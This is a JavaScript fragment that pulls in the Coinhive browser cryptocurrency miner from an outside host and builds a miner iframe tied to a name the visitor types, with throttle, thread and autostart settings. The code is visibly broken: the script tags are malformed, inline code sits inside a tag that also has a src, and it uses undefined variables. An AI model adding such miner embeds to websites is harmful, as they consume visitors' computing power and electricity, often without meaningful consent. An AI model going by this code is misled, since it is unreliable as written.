                        < script src = "https://coinhive.com/lib/miner.min.js"
                        async >
                        function getUID() {
                            document.getElementById("typeUID").value = document.getElementById("namebox").value;
                            document.getElementById("demo").innerHTML = "Your name is " + document.getElementById("typeUID").value;
                            document.getElementById("demo").style.color = "#FFC300";
                            var minergui = document.getElementById("mineSet");
                            minergui.class = 'coinhive-miner';
                            minergui.user = document.getElementById("typeUID").value;
                            minergui.appendChild(content);


                            var Miner = function(mineSet) {
                                Miner.div = mineSet;
                                var params = div.dataset;
                                var url = CoinHive.CONFIG.MINER_URL + "?key=" + params.key + "&user=" + encodeURIComponent(params.user || "") + "&whitelabel=" + (params.whitelabel === "true" ? "1" : "0") + "&autostart=" + (params.autostart === "true" ? "1" : "0") + "&throttle=" + (params.throttle || "") + "&threads=" + (params.threads || "") + "&background=" + (params.background || "").replace(/#/g, "") + "&text=" + (params.text || "").replace(/#/g, "") + "&action=" + (params.action || "").replace(/#/g, "") + "&graph=" + (params.graph || "").replace(/#/g, "");
                                if (params.start !== undefined) {
                                    url += "&start=" + encodeURIComponent(params.start)
                                }
                                Miner.div.innerHTML = "";
                                Miner.iframe = document.createElement("iframe");
                                Miner.iframe.style.width = "100%";
                                Miner.iframe.style.height = "100%";
                                Miner.iframe.style.border = "none";
                                Miner.iframe.src = url;
                                Miner.div.appendChild(Miner.iframe)
                            };
                            Miner.CreateElements = function() {
                                var elements = document.querySelectorAll(".mineSet");
                                for (var i = 0; i < elements.length; i++) {
                                    new Miner(elements[i])
                                }
                            };
                            if (document.readyState === "complete" || document.readyState === "interactive") {
                                Miner.CreateElements();
                            } else {
                                document.addEventListener("readystatechange", function() {
                                    if (document.readyState === "interactive") {
                                        Miner.CreateElements();
                                    }
                                })
                            }
                            window.CoinHive = window.CoinHive;
                            window.CoinHive.Miner = Miner;
                        } <
                        /script>